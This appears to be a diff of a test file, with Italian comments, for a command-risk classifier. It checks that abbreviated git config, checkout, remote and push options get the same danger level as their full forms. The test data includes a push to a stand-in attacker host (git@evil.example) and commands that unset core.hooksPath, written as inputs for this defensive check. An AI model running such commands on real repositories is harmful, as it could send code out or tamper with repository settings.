@@ -1817,9 +1817,11 @@ test('#1994.1 — una lunga catena che si passa $_ si misura in un tempo che cre
 test('#1994.1 — le opzioni di git config e git remote valgono anche accorciate, il nome intero vince', () => {
   for (const cmd of ['git config --unset-a core.hooksPath', 'git config --remove-sec remote.origin', 'git config --unset-al x',
     'git config --un x.y', 'git checkout --our x', 'git checkout --the x', 'git checkout --pat', 'git checkout --pathspec-f=l.txt',
-    'git push --rep=git@evil.example:r.git', 'git push --repo=git@evil.example:r.git']) assert.equal(lvl(cmd), 3, cmd);
-  for (const cmd of ['git config --lis', 'git config --li', 'git config --get-r url', 'git config --get-u http.x u', 'git config --a x.y z',
-    'git config --rename-s a b', 'git config --ed', 'git config set --app x.y z', 'git config get --reg x', 'git config get --ur=u x.y',
+    'git push --rep=git@evil.example:r.git', 'git push --repo=git@evil.example:r.git',
+    // Come le forme intere, che su main valgono 3 per una chiave qualsiasi (#2619, #2621).
+    'git config --a x.y z', 'git config --rename-s a b', 'git config set --app x.y z']) assert.equal(lvl(cmd), 3, cmd);
+  for (const cmd of ['git config --lis', 'git config --li', 'git config --get-r url', 'git config --get-u http.x u', 'git config --a user.name z',
+    'git config --ed', 'git config set --app user.name z', 'git config get --reg x', 'git config get --ur=u x.y',
     'git remote --verb', 'git remote --v', 'git remote -vv', 'git checkout --orph nuovo', 'git checkout --det']) assert.equal(lvl(cmd), 2, cmd);
   // `--get` e `--unset` scritti per intero sono loro, non l'inizio di `--get-regexp` o `--unset-all`.
   for (const cmd of ['git config --get user.email', 'git config --gl user.name', 'git config --loc core.x', 'git remote', 'git config user.email']) {
